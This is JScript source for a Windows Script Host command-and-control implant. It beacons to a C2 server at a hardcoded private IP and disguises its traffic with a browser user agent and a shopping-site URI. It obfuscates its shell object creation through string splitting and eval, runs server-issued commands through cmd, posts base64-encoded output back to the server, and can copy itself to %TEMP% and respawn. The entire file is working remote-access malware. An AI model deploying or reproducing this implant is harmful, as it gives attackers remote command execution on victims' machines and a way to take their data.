var c2url = "http://192.168.0.4:8080/"
var beaconTime = 3000 //in milliseconds

var curcmd = "{\"cmd\": \"\"}"
var x = "iveXOb"
eval("var objSh = new Act"+x+"ject(\"WScr\" +   \"ipt.Sh\"+  \"ell\")")
var temp = objSh.ExpandEnvironmentStrings("%TEMP%");
var cs = objSh.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
var retval = ""
var serverMsg = ""
var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
var xFrameOptions = "SAMEORIGIN"
var contentEncoding = "gzip"
var contentType = "text/xml"
var agentid = Math.floor(Math.random() * 99999999).toString()
var target = c2url + uri
var initcmd = ""
var selfpath = WScript.ScriptFullName
var selfdata = ""
fso = new ActiveXObject("Scripting.FileSystemObject")
if(fso.FileExists(selfpath))
{
  try
  {
    fd = fso.OpenTextFile(selfpath)
	selfdata = fd.ReadAll();
	fd.close()
  }
  catch (e) {};
}

function webRequest(target) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("GET", target, false);
    //  Send the HTTP request.
    WinHttpReq.Send();
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.
    res = WinHttpReq.ResponseText;
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}
function webPost(target, cmdResponse) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("POST", target, false);

    // Set HTTP Headers
    WinHttpReq.setRequestHeader("User-Agent", useragent);
    WinHttpReq.setRequestHeader("X-Frame-Options", xFrameOptions);
    WinHttpReq.setRequestHeader("Content-Type", contentType);

    //  Send the HTTP request.
    WinHttpReq.Send(cmdResponse);
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.
    res = WinHttpReq.ResponseText;
    //WScript.Echo(res);
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}

function b64(data) {
   var xml = WScript.CreateObject("MSXml2.DOMDocument");
   var element = xml.createElement("Base64Data");
   element.dataType = "bin.base64";
   element.nodeTypedValue = streamStringToBinary(data);
   return element.text.replace(/\n/g, "");
}

function streamStringToBinary(data) {
   var inputStream = WScript.CreateObject("ADODB.Stream");
   inputStream.Type = 2;
   inputStream.CharSet = "us-ascii";
   inputStream.Open();
   inputStream.WriteText(data);

   //Change stream to binary
   inputStream.Position = 0;
   inputStream.Type = 1;
   inputStream.Position = 0;

   var streamData = inputStream.Read();
   inputStream.Close();
   return streamData;
}

while(true)
{
  var b = '{"type":"b","agentid": ' + agentid +'}';
  var serverMsg = webPost(target, b);
  
  //debug
  //WScript.Echo("serverMsg follows:\n\n"+serverMsg)
  
  try 
  {
	var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]

    if (curcmd != jsondata) {
	  curcmd = jsondata
      //Dangerous eval on unsanitized data here
      eval("jsObject="+jsondata);
	  
	  //kill
	  if (jsObject.cmd == "kill") {
		WScript.Quit(1);
	  }
	  
	  //spawn: writes js to %TEMP%
	  if (jsObject.cmd == "spawn") {
		fd = fso.CreateTextFile(temp+"\\"+agentid+".js")
		fd.WriteLine(selfdata)
		fd.close()
		objSh.Run(temp+"\\"+agentid+".js")
		retval = "spawn success..."
	  }
	  
	  //credit to nate and 0sum <3
	  else {
        objSh.Run(cs +" /q /c " + jsObject.cmd + " 1> " + temp + "\\__" + agentid + ".txt" + " 2>&1", 0, true)
		if(fso.FileExists(temp + "\\__" + agentid + ".txt")) {
		  fd = fso.OpenTextFile(temp + "\\__" + agentid + ".txt")
	      retval = fd.ReadAll()
		  fd.close()
		  fso.DeleteFile(temp + "\\__" + agentid + ".txt", true)
		}
		else {
		  retval = "command ran but no results returned"
		}
	  }

      var resp = '{"type":"r","agentid": ' + agentid + ',"taskid":"1","cmd":"' + b64(jsObject.cmd) + '","retval":"' + b64(retval) + '"}';
      webPost(target, resp)
    }
  }
  catch (e) {
    WScript.Sleep(beaconTime);
  }
  WScript.Sleep(beaconTime);
}
